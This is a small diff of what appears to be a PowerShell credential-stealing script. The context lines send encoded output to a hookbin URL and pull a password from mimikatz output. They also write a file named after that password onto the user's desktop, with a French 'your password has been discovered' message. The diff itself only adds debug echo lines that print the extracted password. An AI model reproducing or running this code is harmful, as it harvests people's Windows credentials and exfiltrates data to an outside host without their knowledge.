@@ -29,7 +29,10 @@ $out_encoded  = [System.Web.HttpUtility]::UrlEncode($out)
 (new-object System.net.WebClient).DownloadString("${uri_hookbin}?q=${out_encoded}") > $null 2>&1 
 
 $password = $(cat ./output_mimikatz | Select -Index 33 | FoReach-Object { $_.split(':')[1] } >> ./password_output)
+echo "PASSWORD = $password"
 $password = $password.substring(1)
+echo "PASSWORD APRES SUBSTRING = $password"
+
 echo "Votre mot de passe a été découvert" > "$HOME/Desktop/$password"
 # Cleaning
 cd $repo_path/..
